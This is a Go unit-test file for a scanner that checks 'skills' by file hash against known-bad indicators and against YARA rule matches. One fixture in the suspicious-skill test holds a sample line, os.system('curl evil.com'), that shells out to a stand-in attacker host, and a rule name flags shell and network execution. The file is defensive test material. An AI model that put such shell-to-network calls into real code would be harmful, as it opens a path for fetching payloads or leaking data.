package scanner_test

import (
	"bytes"
	"io"
	"strings"
	"testing"

	"github.com/skillledger/skillledger/internal/ecosystem"
	"github.com/skillledger/skillledger/internal/scanner"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestHashFile_KnownValue(t *testing.T) {
	r := strings.NewReader("hello world")
	hash, err := scanner.HashFile(r)
	require.NoError(t, err)
	assert.Equal(t, "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9", hash)
}

func TestHashBytes_KnownValue(t *testing.T) {
	hash := scanner.HashBytes([]byte("hello world"))
	assert.Equal(t, "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9", hash)
}

func TestHashFile_EmptyInput(t *testing.T) {
	r := strings.NewReader("")
	hash, err := scanner.HashFile(r)
	require.NoError(t, err)
	// SHA-256 of empty string
	assert.Equal(t, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", hash)
}

// mockFileOpener implements scanner.FileOpener for testing.
type mockFileOpener struct {
	files map[string][]byte
}

func (m *mockFileOpener) Open(path string) (io.ReadCloser, error) {
	data, ok := m.files[path]
	if !ok {
		return nil, &mockNotFoundError{path: path}
	}
	return io.NopCloser(bytes.NewReader(data)), nil
}

type mockNotFoundError struct {
	path string
}

func (e *mockNotFoundError) Error() string {
	return "file not found: " + e.path
}

// mockIOCChecker implements scanner.IOCChecker for testing.
type mockIOCChecker struct {
	matches map[string]*scanner.IOCMatchInfo
}

func (m *mockIOCChecker) Match(sha256 string) (*scanner.IOCMatchInfo, bool) {
	match, found := m.matches[sha256]
	return match, found
}

// mockYARAScanner implements scanner.YARAScanner for testing.
type mockYARAScanner struct {
	matches []scanner.YARAMatchInfo
}

func (m *mockYARAScanner) Scan(_ []byte) ([]scanner.YARAMatchInfo, error) {
	return m.matches, nil
}

func makeSkill(id string, files map[string][]byte) (ecosystem.DiscoveredSkill, *mockFileOpener) {
	fileNames := make([]string, 0, len(files))
	fullFiles := make(map[string][]byte)
	for name, content := range files {
		fileNames = append(fileNames, name)
		fullFiles["/skills/"+id+"/"+name] = content
	}
	skill := ecosystem.DiscoveredSkill{
		ID:   id,
		Name: id,
		Kind: "test-skill",
		Path: "/skills/" + id,
		Files: fileNames,
	}
	return skill, &mockFileOpener{files: fullFiles}
}

func TestScanner_CleanSkill(t *testing.T) {
	skill, opener := makeSkill("clean-skill", map[string][]byte{
		"main.py": []byte("print('hello')"),
	})

	s := scanner.NewScanner(opener)
	results, err := s.Scan([]ecosystem.DiscoveredSkill{skill})
	require.NoError(t, err)
	require.Len(t, results, 1)

	assert.Equal(t, "clean", results[0].Status)
	assert.NotEmpty(t, results[0].SHA256)
	assert.Nil(t, results[0].IOCMatch)
	assert.Empty(t, results[0].YARAMatches)
}

func TestScanner_CompromisedSkill(t *testing.T) {
	skill, opener := makeSkill("bad-skill", map[string][]byte{
		"payload.js": []byte("malicious code"),
	})

	// First, compute what the hash will be
	s := scanner.NewScanner(opener)
	results, err := s.Scan([]ecosystem.DiscoveredSkill{skill})
	require.NoError(t, err)
	require.Len(t, results, 1)
	skillHash := results[0].SHA256

	// Now create a scanner with IOC checker that matches this hash
	iocChecker := &mockIOCChecker{
		matches: map[string]*scanner.IOCMatchInfo{
			skillHash: {
				SHA256:      skillHash,
				Description: "Known malicious skill",
				Severity:    "critical",
			},
		},
	}

	s = scanner.NewScanner(opener, scanner.WithIOC(iocChecker))
	results, err = s.Scan([]ecosystem.DiscoveredSkill{skill})
	require.NoError(t, err)
	require.Len(t, results, 1)

	assert.Equal(t, "compromised", results[0].Status)
	require.NotNil(t, results[0].IOCMatch)
	assert.Equal(t, "Known malicious skill", results[0].IOCMatch.Description)
	assert.Equal(t, "critical", results[0].IOCMatch.Severity)
}

func TestScanner_SuspiciousSkill(t *testing.T) {
	skill, opener := makeSkill("suspect-skill", map[string][]byte{
		"tool.py": []byte("import os; os.system('curl evil.com')"),
	})

	yaraScanner := &mockYARAScanner{
		matches: []scanner.YARAMatchInfo{
			{RuleName: "suspicious_shell_exec", Tags: []string{"shell", "network"}},
		},
	}

	s := scanner.NewScanner(opener, scanner.WithYARA(yaraScanner))
	results, err := s.Scan([]ecosystem.DiscoveredSkill{skill})
	require.NoError(t, err)
	require.Len(t, results, 1)

	assert.Equal(t, "suspicious", results[0].Status)
	assert.Nil(t, results[0].IOCMatch)
	require.Len(t, results[0].YARAMatches, 1)
	assert.Equal(t, "suspicious_shell_exec", results[0].YARAMatches[0].RuleName)
}

func TestScanner_CompromisedOverridesSuspicious(t *testing.T) {
	skill, opener := makeSkill("double-bad", map[string][]byte{
		"evil.js": []byte("bad stuff"),
	})

	// Get the hash first
	s := scanner.NewScanner(opener)
	results, err := s.Scan([]ecosystem.DiscoveredSkill{skill})
	require.NoError(t, err)
	skillHash := results[0].SHA256

	iocChecker := &mockIOCChecker{
		matches: map[string]*scanner.IOCMatchInfo{
			skillHash: {SHA256: skillHash, Description: "known bad", Severity: "high"},
		},
	}
	yaraScanner := &mockYARAScanner{
		matches: []scanner.YARAMatchInfo{
			{RuleName: "test_rule"},
		},
	}

	s = scanner.NewScanner(opener, scanner.WithIOC(iocChecker), scanner.WithYARA(yaraScanner))
	results, err = s.Scan([]ecosystem.DiscoveredSkill{skill})
	require.NoError(t, err)
	require.Len(t, results, 1)

	// IOC match should set "compromised", even though YARA also matched
	assert.Equal(t, "compromised", results[0].Status)
	assert.NotNil(t, results[0].IOCMatch)
	assert.Len(t, results[0].YARAMatches, 1)
}

func TestScanner_MultipleFiles(t *testing.T) {
	skill, opener := makeSkill("multi-file", map[string][]byte{
		"a.py": []byte("file a"),
		"b.py": []byte("file b"),
		"c.py": []byte("file c"),
	})

	s := scanner.NewScanner(opener)
	results, err := s.Scan([]ecosystem.DiscoveredSkill{skill})
	require.NoError(t, err)
	require.Len(t, results, 1)

	assert.Equal(t, "clean", results[0].Status)
	assert.NotEmpty(t, results[0].SHA256)
}

func TestScanner_EmptySkill(t *testing.T) {
	skill := ecosystem.DiscoveredSkill{
		ID:    "empty",
		Name:  "empty",
		Kind:  "test",
		Path:  "/skills/empty",
		Files: []string{},
	}
	opener := &mockFileOpener{files: map[string][]byte{}}

	s := scanner.NewScanner(opener)
	results, err := s.Scan([]ecosystem.DiscoveredSkill{skill})
	require.NoError(t, err)
	require.Len(t, results, 1)

	assert.Equal(t, "clean", results[0].Status)
	assert.Empty(t, results[0].SHA256)
}
